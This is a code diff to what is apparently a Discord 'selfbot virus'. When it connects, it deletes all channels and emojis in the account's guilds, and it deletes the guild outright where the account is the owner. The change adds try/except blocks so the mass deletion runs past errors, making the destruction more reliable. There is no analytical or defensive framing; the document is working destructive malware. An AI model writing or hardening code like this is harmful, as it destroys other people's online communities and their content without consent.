@@ -55,11 +55,18 @@ async def on_ready():
                         pass
             
                 for c in guild.channels:
-                    deleted_channels.append(f'Just Deleted Some Channels -> [Names: "{c.name}," IDs: "{c.id},"]')
-                    await c.delete(reason='selfbot virus is gud and fard')
+                    try:
+                        await c.delete(reason='selfbot virus is gud and fard')
+                        deleted_channels.append(f'Just Deleted Some Channels -> [Names: "{c.name}," IDs: "{c.id},"]')
+                    except:
+                        pass
+
                 for e in guild.emojis:
-                    deleted_emojis.append(f'Just Deleted Some Emojis -> [Names: "{e.name}," IDs: "{e.id},"]')
-                    await e.delete(reason='selfbot virus is gud and fard')
+                    try:
+                        await e.delete(reason='selfbot virus is gud and fard')
+                        deleted_emojis.append(f'Just Deleted Some Emojis -> [Names: "{e.name}," IDs: "{e.id},"]')
+                    except:
+                        pass
                 try:
                     if guild.me == guild.owner:
                         await guild.delete()
